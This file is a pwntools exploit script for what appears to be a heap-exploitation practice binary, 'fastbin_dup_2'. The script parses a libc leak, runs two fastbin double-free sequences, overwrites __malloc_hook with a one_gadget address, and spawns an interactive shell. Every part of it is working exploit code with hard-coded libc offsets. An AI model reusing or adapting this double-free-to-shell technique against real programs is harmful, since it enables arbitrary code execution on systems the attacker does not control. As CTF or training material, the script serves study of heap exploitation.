from pwn import *
context.binary = "./fastbin_dup_2"
p = process()

script="""
b*main+322
b*main+393
b*main+491
"""

#p = remote("localhost",2000)
def malloc(mysize: int, mydata: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(mysize).encode())
    p.sendafter(b'data: ', mydata)

def free(myidx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(myidx).encode())


p.recvuntil(b'puts() @ ')
leak_libc = int(p.recvline().strip(b'\n'),16)
libc_base = leak_libc - 0x6faf0
one_gadget = libc_base + 0xe1fa1
overwrite_malloc_hook = libc_base + 0x3b4b2d
log.success("Leak libc: %s", hex(leak_libc))
log.success("Leak one_gadget: %s", hex(one_gadget))
malloc(0x30,b'A'*8)
malloc(0x30,b'B'*8)

free(0)
free(1)
free(0)
# gdb.attach(p,script)
malloc(0x30,p64(0x51))
malloc(0x30,b'C'*8)
malloc(0x30,b'D'*8)



malloc(0x40,b'E'*8)
malloc(0x40,b'F'*8)

free(5)
free(6)
free(5)

malloc(0x40,p64(libc_base+0x3b4b78))
malloc(0x40,b'-s\x00')
malloc(0x40,b'/bin/sh\x00')
malloc(0x40,p64(0)*7+p64(overwrite_malloc_hook))
#gdb.attach(p,script)

malloc(0x28,cyclic(19)+p64(one_gadget))

##Get shell:
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'size: ', str(0x20).encode())
p.interactive()